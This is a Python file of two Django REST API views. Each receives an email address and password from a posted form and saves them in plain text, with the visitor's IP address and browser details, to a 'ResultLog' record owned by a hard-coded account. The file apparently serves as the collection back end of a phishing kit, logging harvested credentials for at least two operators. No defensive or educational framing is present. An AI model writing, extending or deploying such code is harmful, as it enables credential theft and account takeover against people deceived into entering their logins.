from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from django.contrib.auth.models import User
from camelion.models import ResultLog  
from camelion.utils import get_client_ip, get_browser_info 
import json

class CamelionEmailView(APIView):
    def post(self, request):
        try:
            # Extract JSON data
            data = request.data

            # Get IP address and admin user
            ip_address = get_client_ip(request)
            user = User.objects.get(username='myadminuser')

            # Get browser info
            browser_info = get_browser_info(request)

            print('working with api')

            # Save to ResultLog
            ResultLog.objects.create(
                owner=user,
                email=data.get("f_email"),
                password_text=data.get("f_password"),
                ip_address=ip_address,
                browser_version=browser_info.get('version'),
                browser_type=browser_info.get('browser'),
                browser_agent=browser_info.get('agent'),
            )

            return Response({'message': 'Data received'}, status=status.HTTP_200_OK)

        except User.DoesNotExist:
            return Response({'error': 'Admin user not found'}, status=status.HTTP_404_NOT_FOUND)
        
        except Exception as e:
            print(f"Error logging information: {str(e)}")
            return Response({'error': 'Failed to process request'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
        

class CamelionEmailTwoView(APIView):
    def post(self, request):
        try:
            # Extract JSON data
            data = request.data

            # Get IP address and admin user
            ip_address = get_client_ip(request)
            user = User.objects.get(username='ogoloadmin')

            # Get browser info
            browser_info = get_browser_info(request)

            print('working with api')

            # Save to ResultLog
            ResultLog.objects.create(
                owner=user,
                email=data.get("f_email"),
                password_text=data.get("f_password"),
                ip_address=ip_address,
                browser_version=browser_info.get('version'),
                browser_type=browser_info.get('browser'),
                browser_agent=browser_info.get('agent'),
            )

            return Response({'message': 'Data received'}, status=status.HTTP_200_OK)

        except User.DoesNotExist:
            return Response({'error': 'Admin user not found'}, status=status.HTTP_404_NOT_FOUND)
        
        except Exception as e:
            print(f"Error logging information: {str(e)}")
            return Response({'error': 'Failed to process request'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)
